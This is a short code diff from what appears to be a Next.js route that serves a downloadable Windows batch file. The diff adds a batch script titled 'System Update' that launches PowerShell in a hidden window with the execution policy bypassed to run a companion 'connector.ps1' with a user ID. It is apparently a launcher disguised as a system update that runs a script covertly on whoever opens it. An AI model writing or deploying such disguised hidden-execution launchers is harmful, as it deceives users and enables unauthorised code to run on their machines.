@@ -28,9 +28,10 @@ title System Update
 powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0connector.ps1" "${userUid}"
 exit`
 
-    // Create a self-extracting executable using PowerShell
+    // Create a simple batch file
     const exeContent = `@echo off
-powershell.exe -WindowStyle Hidden -Command "& {$batchContent.replace(/"/g, '`"')}"
+title System Update
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0connector.ps1" "${userUid}"
 exit`
 
     return new NextResponse(exeContent, {
